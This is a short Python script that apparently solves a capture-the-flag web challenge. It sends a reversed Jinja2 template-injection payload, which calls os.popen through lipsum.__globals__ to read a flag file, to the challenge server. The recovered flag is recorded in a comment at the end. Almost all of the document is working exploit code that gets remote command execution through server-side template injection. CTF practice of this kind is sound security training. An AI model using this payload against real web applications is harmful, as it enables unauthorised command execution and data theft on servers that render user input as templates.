import requests

payload = "{{lipsum.__globals__.os.popen('cat flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt').read()}}"
print(payload)

data = {
	"text" : payload[::-1]
}
res = requests.post("https://reverser.mc.ax/",data=data)

print(res.text)

# flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt
# hope{cant_misuse_templates}